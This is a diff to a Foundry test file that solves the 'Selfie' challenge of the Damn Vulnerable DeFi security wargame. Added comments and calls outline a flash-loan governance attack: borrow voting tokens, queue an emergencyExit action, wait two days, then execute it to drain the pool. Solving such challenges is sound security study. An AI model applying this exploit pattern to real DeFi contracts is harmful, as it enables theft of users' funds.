@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,19 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // Flash Loan enough tokens. 
+        // To flash loan, we need to create a contract (see Attacker) that will, 
+        // Create an action with queueAction.
+        // Target -> pool. Value -> 0. Data -> emergencyExit(recovery)
+        // This action will call SelfiePool's emergency exit and send all funds to recover address.
+        // Thats all.
+        Attacker attacker = new Attacker(token, governance, pool, recovery);
+        attacker.flashLoanAndQueueAction();
+
+        // Wait for 2 DAYS to execute action.
+        skip(2 days);
+
+        attacker.executeAction();
     }
 
     /**
